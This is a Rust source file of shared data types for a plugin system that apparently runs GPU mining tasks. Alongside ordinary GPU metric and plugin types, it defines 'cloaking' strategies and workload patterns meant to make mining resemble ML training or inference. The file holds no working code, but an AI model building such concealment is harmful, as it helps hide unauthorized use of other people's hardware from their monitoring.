/*!
 * Common Types
 * 
 * Định nghĩa các types chung được sử dụng across plugins.
 */

use serde::{Deserialize, Serialize};
use std::time::Duration;

/// GPU Metrics (Số liệu GPU)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GPUMetrics {
    /// GPU device ID
    pub device_id: u32,
    
    /// GPU utilization percentage (0-100)
    pub utilization_percent: f32,
    
    /// GPU temperature in Celsius
    pub temperature_celsius: f32,
    
    /// Power usage in watts
    pub power_watts: f32,
    
    /// Memory used in MB
    pub memory_used_mb: u64,
    
    /// Memory total in MB
    pub memory_total_mb: u64,
    
    /// GPU clock speed in MHz
    pub gpu_clock_mhz: u32,
    
    /// Memory clock speed in MHz
    pub memory_clock_mhz: u32,
    
    /// Timestamp
    pub timestamp: chrono::DateTime<chrono::Utc>,
}

/// Process Information (Thông tin tiến trình)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    /// Process ID
    pub pid: u32,
    
    /// Process name
    pub name: String,
    
    /// CPU usage percentage
    pub cpu_percent: f32,
    
    /// Memory usage in MB
    pub memory_mb: u64,
    
    /// GPU device ID (if applicable)
    pub gpu_id: Option<u32>,
}

/// Plugin Metadata (Metadata plugin)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PluginMetadata {
    /// Plugin name
    pub name: String,
    
    /// Plugin version
    pub version: String,
    
    /// Plugin description
    pub description: String,
    
    /// Plugin author
    pub author: String,
}

/// Health Status (Trạng thái sức khỏe)
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum HealthStatus {
    /// Healthy - plugin running normally
    Healthy,
    
    /// Degraded - plugin running but with issues
    Degraded,
    
    /// Unhealthy - plugin not functioning properly
    Unhealthy,
    
    /// Unknown - health status cannot be determined
    Unknown,
}

impl Default for HealthStatus {
    fn default() -> Self {
        Self::Unknown
    }
}

/// Mining Task (Tác vụ khai thác)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MiningTask {
    /// Task ID
    pub id: u64,
    
    /// Task data
    pub data: Vec<u8>,
    
    /// Priority (0 = lowest, higher = more important)
    pub priority: u8,
    
    /// Timeout
    pub timeout: Duration,
}

/// Mining Result (Kết quả khai thác)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MiningResult {
    /// Task ID
    pub task_id: u64,
    
    /// Result data
    pub result: Vec<u8>,
    
    /// Execution time
    pub execution_time: Duration,
    
    /// Success status
    pub success: bool,
}

/// Cloaking Strategy (Chiến lược ngụy trang)
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum CloakStrategy {
    /// Adaptive - mixed training/inference
    Adaptive,
    
    /// Training - simulate ML training workload
    Training,
    
    /// Inference - simulate ML inference workload
    Inference,
    
    /// Complex - multi-layer patterns
    Complex,
}

impl Default for CloakStrategy {
    fn default() -> Self {
        Self::Adaptive
    }
}

/// Workload Pattern (Mẫu tải công việc)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkloadPattern {
    /// Pattern type
    pub strategy: CloakStrategy,
    
    /// Duty cycle (0.0-1.0)
    pub duty_cycle: f32,
    
    /// Power variation (0.0-1.0)
    pub power_variation: f32,
    
    /// VRAM allocation (0.0-1.0)
    pub vram_allocation: f32,
    
    /// Timestamp
    pub timestamp: chrono::DateTime<chrono::Utc>,
}
